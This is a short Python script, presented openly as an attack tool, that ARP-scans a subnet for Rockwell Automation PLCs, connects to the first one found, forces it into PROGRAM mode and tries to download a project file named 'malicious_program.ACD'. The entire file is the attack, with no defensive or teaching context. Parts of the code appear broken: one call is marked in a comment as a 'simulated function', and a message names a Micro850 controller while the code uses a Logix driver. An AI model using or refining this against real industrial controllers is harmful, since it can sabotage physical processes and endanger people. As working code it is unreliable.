import socket
import struct
import time
from pycomm3 import CIPDriver, LogixDriver
from scapy.all import ARP, Ether, srp

# GLOBAL VARIABLES
SUBNET = "192.168.1.0/24"  # Change this to match the network range
PLC_MAC_PREFIX = "00:0e:cf"  # Rockwell Automation MAC Prefix (use first 3 octets)
PROGRAM_PATH = "malicious_program.ACD"  # Path to malicious Studio 5000 project file

# Function to find the PLC's IP address
def find_plc_ip(subnet):
    print("[*] Scanning network for Rockwell PLC...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet), timeout=2, verbose=False)

    for sent, received in ans:
        mac_address = received.hwsrc.lower()
        ip_address = received.psrc
        if mac_address.startswith(PLC_MAC_PREFIX):
            print(f"[+] Found Rockwell PLC: {ip_address} (MAC: {mac_address})")
            return ip_address

    print("[-] No PLC found on the network.")
    return None

# Function to upload a new program to the PLC
def download_program(plc_ip):
    print(f"[*] Connecting to PLC at {plc_ip}...")
    with LogixDriver(plc_ip) as plc:
        if plc.connected:
            print("[+] Connected to Micro850 successfully.")
            
            # Ensure the PLC is in PROG mode before attempting a download
            mode = plc.get_plc_mode()
            print(f"[*] Current PLC mode: {mode}")
            
            if mode != "PROGRAM":
                print("[*] Changing PLC to PROGRAM mode...")
                plc.set_plc_mode("PROGRAM")
                time.sleep(2)

            print(f"[*] Attempting to upload new program: {PROGRAM_PATH}...")
            success = plc.download(program_name=PROGRAM_PATH)  # Simulated function

            if success:
                print("[+] Program downloaded successfully.")
            else:
                print("[-] Failed to download program.")
        else:
            print("[-] Failed to connect to PLC.")

# Main Execution
if __name__ == "__main__":
    plc_ip = find_plc_ip(SUBNET)
    if plc_ip:
        download_program(plc_ip)